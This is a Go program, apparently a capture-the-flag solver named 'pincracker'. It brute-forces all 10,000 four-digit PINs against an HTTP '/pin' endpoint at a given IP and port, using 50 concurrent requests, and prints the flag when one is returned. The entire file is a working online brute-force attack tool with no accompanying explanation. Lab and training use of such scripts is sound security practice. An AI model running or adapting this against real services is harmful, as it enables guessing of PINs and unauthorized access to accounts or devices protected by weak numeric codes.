package main

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"sync"
	"time"
)

type Response struct {
	Flag string `json:"flag"`
}

func main() {
	start := time.Now()

	if len(os.Args) < 2 {
		fmt.Println("[*] Usage: pincracker <ip:port>  OR  pincracker <ip> <port>")
		os.Exit(1)
	}

	var ip string
	var port string

	host, targetPort, err := net.SplitHostPort(os.Args[1])
	
	if err == nil {
		ip = host
		port = targetPort
	} else {
		ip = os.Args[1]
		
		if len(os.Args) < 3 {
			fmt.Println("[!] ERROR: Specify the port.")
			fmt.Println("[*] Usage: pincracker <ip:port>  OR  pincracker <ip> <port>")
			os.Exit(1)
		}
		port = os.Args[2]
	}

	fmt.Printf("[*] Scanning target -> IP: %s | Port: %s\n", ip, port)

	var wg sync.WaitGroup
	routines := make(chan struct{}, 50)

	for pin := 0; pin < 10000; pin++ {
		wg.Add(1)
		routines <- struct{}{}

		go func(p int) {
			defer wg.Done()
			defer func() { <-routines }()

			formattedPin := fmt.Sprintf("%04d", p)
			url := fmt.Sprintf("http://%s:%s/pin?pin=%s", ip, port, formattedPin)

			res, err := http.Get(url)
			if err != nil {
				return
			}
			defer res.Body.Close()

			var result Response
			err = json.NewDecoder(res.Body).Decode(&result)
			if err != nil {
				return
			}

			if result.Flag != "" {
				fmt.Printf("\n[+] Pin was found: %s\n", formattedPin)
				fmt.Printf("[+] Flag: %s\n", result.Flag)
				fmt.Printf("[*] Total time: %s\n", time.Since(start))
				os.Exit(0)
			}
		}(pin)
	}

	wg.Wait()
	fmt.Println("\n[-] Program exhausted. PIN not found.")
	
	fmt.Printf("[*] Total time: %s\n", time.Since(start))
}
